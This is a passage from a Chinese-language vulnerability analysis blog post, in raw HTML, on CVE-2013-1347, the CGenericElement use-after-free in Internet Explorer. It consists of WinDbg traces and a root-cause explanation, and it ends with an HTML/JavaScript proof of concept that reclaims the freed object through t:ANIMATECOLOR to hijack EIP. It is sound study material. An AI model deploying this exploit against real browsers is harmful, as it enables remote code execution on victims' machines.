class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">05ee3fb0  05ec0fd8 079d9fb0 ffff0030 ffffffff</span><br><span class="line">05ee3fc0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3fd0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3fe0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">05ee4000  ???????? ???????? ???????? ????????</span><br><span class="line">05ee4010  ???????? ???????? ???????? ????????</span><br><span class="line">05ee4020  ???????? ???????? ???????? ????????</span><br><span class="line">05ec0fd8  68559250 mshtml!CHRElement::`vftable&apos;</span><br><span class="line">eax=05ee3fb0 ebx=00000000 ecx=05ee3fb0 edx=00000008 esi=05ee3fb0 edi=05ec0fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br></pre></td></tr></table></figure></p><p>然后查看 <code>CGenericElement</code> 和 <code>CTable</code>  元素及对应的 <code>CTreeNode</code> 是否被释放。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 076fefc8      CGenericElement</span><br><span class="line">    address 076fefc8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    7b7064c:          76fe000             2000</span><br><span class="line"> </span><br><span class="line">0:005&gt; !heap -p -a 0770cfb0      CGenericElement对应的CTreeNode</span><br><span class="line">    address 0770cfb0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 78720d0:          770cfb0               4c -          770c000             2000</span><br><span class="line"> </span><br><span class="line">0:005&gt; !heap -p -a 07a80fb8      CTable</span><br><span class="line">    address 07a80fb8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    7b70f08:          7a80000             2000</span><br><span class="line"></span><br><span class="line">0:005&gt; !heap -p -a 07a72fb0      CTable对应的CTreeNode</span><br><span class="line">    address 07a72fb0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 7872034:          7a72fb0               4c -          7a72000             2000</span><br></pre></td></tr></table></figure></p><p>可以看到 <code>CGenericElement</code> 和 <code>CTable</code> 都已经被释放，但是 <code>CTreeNode</code> 并没有被释放。所以属于第二种情况。可以猜测可能是由于当对<code>CTreeNode</code>指向的元素进行访问时，因为已经被删除，所以发生了异常。下面我们来看下哪些函数对 <code>CGenericElement</code> 的 <code>CTreeNode</code> 进行了访问(地址和上面调试的有出入，因为重新调了下)。<br><img src="http://static.zybuluo.com/dane909/uonmfny44d06qlb7glxz1xff/QQ%E6%88%AA%E5%9B%BE20180712194202.png" alt="QQ截图20180712194202.png-67.7kB"><br>由调试可知，<code>ISpanQualifier::GetFancyFormat</code> 函数里的 <code>CTreeNode</code> 参数来自于上一个函数的 <code>esi</code>,调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; bu ISpanQualifier::GetFancyFormat</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429af esp=0448acf0 ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat:</span><br><span class="line">682429af 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b1 esp=0448acf0 ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x2:</span><br><span class="line">682429b1 55              push    ebp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b2 esp=0448acec ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x3:</span><br><span class="line">682429b2 8bec            mov     ebp,esp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b4 esp=0448acec ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x5:</span><br><span class="line">682429b4 56              push    esi</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b5 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x6:</span><br><span class="line">682429b5 8bf0            mov     esi,eax</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b7 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x8:</span><br><span class="line">682429b7 e872330400      call    mshtml!ISpanQualifier::IsTreeNodeQualifier (68285d2e)</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429bc esp=0448ace8 ebp=0448acec iopl=0         nv up ei ng nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0xd:</span><br><span class="line">682429bc 84c0            test    al,al</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429be esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0xf:</span><br><span class="line">682429be 0f849e5d2300    je      mshtml!ISpanQualifier::GetFancyFormat+0x1a (68478762) [br=0]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429c4 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x11:</span><br><span class="line">682429c4 8bce            mov     ecx,esi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=06ad8fb0 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429c6 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x13:</span><br><span class="line">682429c6 e84e881600      call    mshtml!CTreeNode::GetFancyFormat (683ab219)</span><br><span class="line">0:005&gt; ln poi(poi(06ad8fb0))</span><br><span class="line">(682a8fd8)   mshtml!CSpanElement::`vftable&apos;   |  (681b73d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>继续回溯 <code>mshtml!SLayoutRun::HasInlineMbp</code> 函数。<br><img src="http://static.zybuluo.com/dane909/j8vjlg0ktfvi2u9nfyll195c/QQ%E6%88%AA%E5%9B%BE20180712202009.png" alt="QQ截图20180712202009.png-60.9kB"><br>继续回溯到函数 <code>mshtml!SRunPointer::HasInlineMbp</code>,在调用 <code>SLayoutRun::HasInlineMbp</code> 函数之前也调用了 <code>SRunPointer::SpanQualifier(void)</code>。如下图<br><img src="http://static.zybuluo.com/dane909/dgj3hjbaq6xdlkunvf7n9xr0/QQ%E6%88%AA%E5%9B%BE20180712203202.png" alt="QQ截图20180712203202.png-38.4kB"><br>跟进函数 <code>SRunPointer::SpanQualifier(void)</code> 发现其主要功能是 <code>eax= [[eax+4]+c]</code>,现在的 <code>eax</code> 即为 <code>CTreeNode</code> 的地址。<br><img src="http://static.zybuluo.com/dane909/me65zvw7mxgwrewukv0kdoyr/QQ%E6%88%AA%E5%9B%BE20180712203237.png" alt="QQ截图20180712203237.png-46.7kB"><br>下面通过 <code>windbg</code> 调试看下在崩溃前 <code>eax+4</code> 地址处内存。如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&apos;=====eax+4=====&apos;</span><br><span class="line">0481cec8  07516fd0 00000000 06f58fc8 0481cf0c</span><br><span class="line">0481ced8  685b4b64 0481cef3 00000000 00000000</span><br><span class="line">0481cee8  0481d018 68625be8 0000cf04 00000000</span><br><span class="line">0481cef8  00000031 0481cf73 687406bf 0481cf58</span><br><span class="line">0481cf08  685ecc7b 0481cf58 687fe223 0481cf77</span><br><span class="line">0481cf18  0481cf8b 07e30ff0 0481d048 00000002</span><br><span class="line">0481cf28  05520fd8 00000000 0481cf8b 06f58f00</span><br><span class="line">0481cf38  0481d001 05e51fd8 00000000 05520fd8</span><br><span class="line">(ddc.b50): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=68a89100 ebx=06faafb0 ecx=078cefc8 edx=00000000 esi=0481cba8 edi=00000000</span><br><span class="line">eip=6870b68d esp=0481cb7c ebp=0481cb94 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6870b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:078cefc8=????????</span><br><span class="line">0:005&gt; dd 07516fd0 LC</span><br><span class="line">07516fd0  00000805 00000002 06faafc0 06faafb0</span><br><span class="line">07516fe0  00000806 00000003 06faafd8 06faafb0</span><br><span class="line">07516ff0  00000806 00000004 05e51fd8 05e51fb0</span><br><span class="line">0:005&gt; dd 07516fc0 L10</span><br><span class="line">07516fc0  00000805 00000001 05e51fc0 05e51fb0</span><br><span class="line">07516fd0  00000805 00000002 06faafc0 06faafb0</span><br><span class="line">07516fe0  00000806 00000003 06faafd8 06faafb0</span><br><span class="line">07516ff0  00000806 00000004 05e51fd8 05e51fb0</span><br><span class="line">0:005&gt; ln poi(poi(05e51fb0))</span><br><span class="line">(68648fd8)   mshtml!CSpanElement::`vftable&apos;   |  (685573d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>如上，<code>eax+4</code> 指向一个结构体数组，还原结构体的大概如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elememt_arry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> unkown;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">int</span> CTreePos;</span><br><span class="line">    <span class="keyword">int</span> CTreeNode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>下面通过栈回溯去查看这个数组所占内存的来源。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 07516fc0  </span><br><span class="line">    address 07516fc0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 51000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 75105e4:          7516fc0               40 -          7516000             2000</span><br><span class="line">    6cba8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    77235e26 ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">    771fa376 ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">    771c5ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line">    6870d7d0 mshtml!_HeapRealloc+0x00000036</span><br><span class="line">    687234e2 mshtml!CImplAry::EnsureSizeWorker+0x000000a1</span><br><span class="line">    686c9b04 mshtml!CImplAry::AppendIndirect+0x00000027</span><br><span class="line">    68609ad9 mshtml!CTextBlock::AddAtomRun+0x00000105</span><br><span class="line">    68612b04 mshtml!CTextBlock::BuildSpanBeginRun+0x000000c4</span><br><span class="line">    68603e11 mshtml!CTextBlock::BuildTextBlock+0x00000aeb</span><br><span class="line">    68603488 mshtml!CLayoutBlock::BuildBlock+0x000001ec</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f1290 mshtml!CCssDocumentLayout::GetPage+0x0000022a</span><br><span class="line">    685f2176 mshtml!CCssPageLayout::CalcSizeVirtual+0x00000254</span><br><span class="line">    6875566c mshtml!CLayout::CalcSize+0x000002b8</span><br><span class="line">    68765c6b mshtml!CLayout::DoLayout+0x0000011d</span><br><span class="line">    686293f1 mshtml!CCssPageLayout::Notify+0x00000140</span><br><span class="line">    6871e667 mshtml!NotifyElement+0x00000041</span><br><span class="line">    6872c76b mshtml!NotifyAncestors+0x000001b7</span><br><span class="line">    6871214b mshtml!CMarkup::SendNotification+0x00000092</span><br><span class="line">    687120be mshtml!CMarkup::Notify+0x000000d6</span><br><span class="line">    6875c083 mshtml!CElement::SendNotification+0x0000004a</span><br><span class="line">    6879574e mshtml!CElement::EnsureRecalcNotify+0x0000015f</span><br><span class="line">    68581242 mshtml!CElement::GetOffsetParentHelper+0x00000060</span><br><span class="line">    6865d442 mshtml!CElement::get_offsetParent+0x00000030</span><br><span class="line">    6878bb55 mshtml!G_IDispatchp+0x0000007b</span><br><span class="line">    68635ea6 mshtml!CBase::ContextInvokeEx+0x000002d0</span><br></pre></td></tr></table></figure></p><p>下面看泉哥说的数组是在创建<code>CTextBlock</code>时生成的，<code>CTreeNode+0x44</code>保存的是结构 <code>CTextBlock</code>的地址，<code>CTextBlock+0x58</code> 存储的时数组地址(偷下懒)。<br>下面都是参考的 <code>exp-sky</code> 前辈的 <a href="https://github.com/exp-sky/Blog/blob/master/CVE-2013-1347_Analysis/CVE-2013-1347_Analysis.md" target="_blank" rel="noopener">CVE-2013-1347 Microsoft Internet Explorer CGenericElement Object Use After Free Vulnerability Analysis</a>。（自己好弱</p><p>通过对比分析发现当 <code>javascript</code> 代码块中存在修改 <code>DOM</code> 树的代码时，并且存在未被渲染的DOM元素时（新创建的 <code>DOM</code> 元素）如果调用了 <code>offsetParent</code> 代码（可根据任意元素来引用）。将导致未被渲染过的元素属性被修改为已渲染。这样在修改其 <code>DOM</code> 节点时(如通过 <code>innerHTML</code> 属性来释放其所有子元素)也不会通过<code>CtreeNode::ComputeFormats</code> 函数重新计算节点格式。导致浏览器并不知道元素释放情况，也未更新元素节点关系。<br>正常的处理流程是，当通过 <code>innerHTML</code> 释放了未被渲染的元素的所有子元素后。其会通过以下流程的函数调用最终调用到 <code>CtreeNode::ComputeFormats</code> 函数对 <code>CTreeNode</code>节点进行重新计算。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GS_PropEnum</span><br><span class="line">|- CElement::put_innerHTML</span><br><span class="line">|- Celement::InjectCompatBSTR</span><br><span class="line">|- CElement_InjectInternal</span><br><span class="line">|- CtreeNode::IsEditable</span><br><span class="line">|- CtreeNode::GetCharFormat⇐ 判断属性</span><br><span class="line">|- CtreeNode::GetCHarFormatHelper</span><br><span class="line">|- CtreeNode::GetCharFormatIndexHelper</span><br><span class="line">|- CtreeNode::ComputeFormatsHelper</span><br><span class="line">|- CtreeNode::ComputeFormats</span><br></pre></td></tr></table></figure></p><p><code>CtreeNode::GetCharFormat</code> 会判断 <code>CTreeNode</code> 的属性，即偏移 <code>0xc</code> 处的引用计数值，当引用计数值大于0时，表示已经渲染，无需重新计算 <code>CTreeNode</code>，因此则不进入 <code>CtreeNode::GetCHarFormatHelper</code> 函数也无法调用到其后续函数 <code>CtreeNode::ComputeFormats</code> 对 <code>CTreeNode</code> 进行重新计算。这种情况下处理流程如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GS_PropEnum</span><br><span class="line">|- CElement::put_innerHTML</span><br><span class="line">|- Celement::InjectCompatBSTR</span><br><span class="line">|- CElement_InjectInternal</span><br><span class="line">|- CtreeNode::IsEditable</span><br><span class="line">|- CtreeNode::GetCharFormat⇐ 判断属性</span><br></pre></td></tr></table></figure></p><p>在 <code>javascript</code> 执行完成后，浏览器会重新渲染 <code>DOM</code> 树，因为之前并没有去重新计算<code>CGenericElement</code> 的 <code>CTreeNode</code> 节点，导致了浏览器仍然企图渲染释放后的元素。最终引用了释放后的元素，成功利用后可以导致任意代码执行。 </p><h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p> 发现泉哥书里还是由很多错误的，比如再分析这个的时候<code>p315</code>说 <code>CTreeNode</code>被清除，还有<code>p325</code> 页<code>CGenericElement</code>的对象大小应为 <code>0x38</code>。<br><img src="http://static.zybuluo.com/dane909/u22qo0hq4wisyzspofw03cbe/QQ%E6%88%AA%E5%9B%BE20180713000129.png" alt="QQ截图20180713000129.png-4.3kB"><br>利用 <code>t:ANIMATECOLOR</code> 来重用被释放的对象，尝试控制 <code>eip</code>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span> <span class="attr">XMLNS:t</span> =<span class="string">"urn:schemas-microsoft-com:time"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span></span><br><span class="line">&lt;?IMPORT namespace="t" implementation="#default#time2"&gt;</span><br><span class="line">&lt;/meta&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function helloWorld()</span><br><span class="line">&#123;</span><br><span class="line">animvalues = ""; </span><br><span class="line"></span><br><span class="line">// mshtml!CElement::Doc:</span><br><span class="line">// 6586c815 8b01            mov     eax,dword ptr [ecx]</span><br><span class="line">// 6586c817 8b5070          mov     edx,dword ptr [eax+70h]</span><br><span class="line">// 6586c81a ffd2            call    edx</span><br><span class="line"></span><br><span class="line">for (i=0; i &lt;= 0x70/4; i++) &#123;</span><br><span class="line">// t:ANIMATECOLOR 标签第一个对象用于覆盖虚表指针</span><br><span class="line">// 由于索引虚函数时，需要偏移0x70，所以这里采用0x70/4去精确控制edx值</span><br><span class="line">if (i == 0x70/4) &#123;</span><br><span class="line">//animvalues += unescape("%u5ed5%u77c1");   </span><br><span class="line">animvalues += unescape("%u4141%u4141");   // 控制edx=0x41414141</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">animvalues += unescape("%u4242%u4242");  // 0x42424242</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(i = 0; i &lt; 13; i++) &#123;</span><br><span class="line">// t:ANIMATECOLOR 标签值是一个用分号分隔的字符串，分号的个数决定对象的大小，</span><br><span class="line">// 对象的每个元素都是一个指针，指向分号分隔出来的字符串</span><br><span class="line">// 漏洞对象CGnericElement大小0x38，所以这里需要包含0x38/4=13个分号 14个字符串</span><br><span class="line">animvalues += ";red";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f0 = document.createElement('span');</span><br><span class="line">document.body.appendChild(f0);</span><br><span class="line">f1 = document.createElement('span');</span><br><span class="line">document.body.appendChild(f1);</span><br><span class="line">f2 = document.createElement('span');</span><br><span class="line">document.body.appendChild(f2);</span><br><span class="line">document.body.contentEditable="true";</span><br><span class="line">f2.appendChild(document.createElement('datalist'));</span><br><span class="line">f1.appendChild(document.createElement('span'));</span><br><span class="line">f1.appendChild(document.createElement('table'));</span><br><span class="line">try&#123;</span><br><span class="line">f0.offsetParent=null;</span><br><span class="line">&#125;catch(e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">f2.innerHTML="";</span><br><span class="line">f0.appendChild(document.createElement('hr'));</span><br><span class="line">f1.innerHTML="";</span><br><span class="line"></span><br><span class="line">CollectGarbage();</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">//使用 t:ANIMATECOLOR 标签可以自由设置其内容，控制对象大小</span><br><span class="line">a = document.getElementById('myanim');</span><br><span class="line">a.values = animvalues;</span><br><span class="line">&#125;</span><br><span class="line">catch(e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload="eval(helloWorld());"&gt;</span><br><span class="line">&lt;t:ANIMATECOLOR id="myanim"/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/dane909/ruycgayu8tqh7f6df9csl8gz/QQ%E6%88%AA%E5%9B%BE20180713001839.png" alt="QQ截图20180713001839.png-83.4kB"><br>可以看到已经成功劫持了 <code>eip</code>，下面就是 <code>rop</code> 的构造啦，具体的可以参考<code>msf</code>提供的脚本。</p>]]></content>
    
    <summary type="html">
    
